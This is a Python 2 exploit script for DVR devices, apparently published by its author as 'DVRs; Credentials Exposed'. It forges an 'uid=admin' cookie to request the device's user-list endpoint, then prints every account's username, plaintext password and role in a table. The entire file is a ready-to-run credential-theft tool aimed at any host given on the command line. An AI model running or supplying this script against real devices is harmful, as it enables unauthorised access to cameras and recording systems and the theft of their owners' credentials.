import json
import requests
import argparse
import tableprint as tp
 
class Colors:
    BLUE        = &#039;\033[94m&#039;
    GREEN       = &#039;\033[32m&#039;
    RED         = &#039;\033[0;31m&#039;
    DEFAULT     = &#039;\033[0m&#039;
    ORANGE      = &#039;\033[33m&#039;
    WHITE       = &#039;\033[97m&#039;
    BOLD        = &#039;\033[1m&#039;
    BR_COLOUR   = &#039;\033[1;37;40m&#039;
 
banner = &#039;&#039;&#039;
                             __..--.._
      .....              .--~  .....  `.
    .":    "`-..  .    .&#039; ..-&#039;"    :". `
    ` `._ ` _.&#039;`"(     `-"&#039;`._ &#039; _.&#039; &#039;
         ~~~      `.          ~~~
                  .&#039;
                 /
                (
                 ^---&#039;
 
 
 [*] @capitan_alfa
&#039;&#039;&#039;
 
details = &#039;&#039;&#039; 
 # Exploit Title:   DVRs; Credentials Exposed
 # Date:            09/04/2018
 # Exploit Author:  Fernandez Ezequiel ( @capitan_alfa )
&#039;&#039;&#039;
parser = argparse.ArgumentParser(prog=&#039;getDVR_Credentials.py&#039;,
                                description=&#039; [+] Obtaining Exposed credentials&#039;, 
                                epilog=&#039;[+] Demo: python getDVR_Credentials.py --host 192.168.1.101 -p 81&#039;,
                                version="1.1")
 
parser.add_argument(&#039;--host&#039;,   dest="HOST",    help=&#039;Host&#039;,    required=True)
parser.add_argument(&#039;--port&#039;,   dest="PORT",    help=&#039;Port&#039;,    default=80)
 
args    =   parser.parse_args()
 
HST     =   args.HOST
port    =   args.PORT
 
headers = {}
 
fullHost_1  =   "http://"+HST+":"+str(port)+"/device.rsp?opt=user&cmd=list"
host        =   "http://"+HST+":"+str(port)+"/"
 
print Colors.GREEN+banner+Colors.DEFAULT
 
 
def makeReqHeaders(xCookie):
    headers["Host"]             =  host
    headers["User-Agent"]       = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
    headers["Accept"]           = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    headers["Accept-Languag"]   = "es-AR,en-US;q=0.7,en;q=0.3"
    headers["Connection"]       = "close"
    headers["Content-Type"]     = "text/html"
    headers["Cookie"]           = "uid="+xCookie
     
    return headers
 
try:
    rX = requests.get(fullHost_1,headers=makeReqHeaders(xCookie="admin"),timeout=10.000)
except Exception,e:
    print Colors.RED+" [+] Timed out\n"+Colors.DEFAULT
    exit()
 
badJson = rX.text
try:
    dataJson = json.loads(badJson)
    totUsr = len(dataJson["list"])   #--> 10
except Exception, e:
    print " [+] Error: "+str(e)
    print " [>] json: "+str(rX)
#    print " [>] Reuest: \n"+str(makeReqHeaders(xCookie="admin"))
    exit()
 
 
print Colors.GREEN+"\n [+] DVR (url):\t\t"+Colors.ORANGE+str(host)+Colors.GREEN
print " [+] Port: \t\t"+Colors.ORANGE+str(port)+Colors.DEFAULT
 
print Colors.GREEN+"\n [+] Users List:\t"+Colors.ORANGE+str(totUsr)+Colors.DEFAULT
print " "
 
final_data = []
try:
    for obj in range(0,totUsr):
 
        temp = []
 
        _usuario    = dataJson["list"][obj]["uid"]
        _password   = dataJson["list"][obj]["pwd"]
        _role       = dataJson["list"][obj]["role"]
 
        temp.append(_usuario) 
        temp.append(_password)
        temp.append(_role)
 
        final_data.append(temp)
 
        hdUsr  = Colors.GREEN + "Username" + Colors.DEFAULT
        hdPass = Colors.GREEN + "Password" + Colors.DEFAULT
        hdRole = Colors.GREEN + "Role ID"  + Colors.DEFAULT
 
        cabeceras = [hdUsr, hdPass, hdRole] 
 
    tp.table(final_data, cabeceras, width=20)
 
except Exception, e:
    print "\n [!]: "+str(e)
    print " [+] "+ str(dataJson)
 
print "\n"

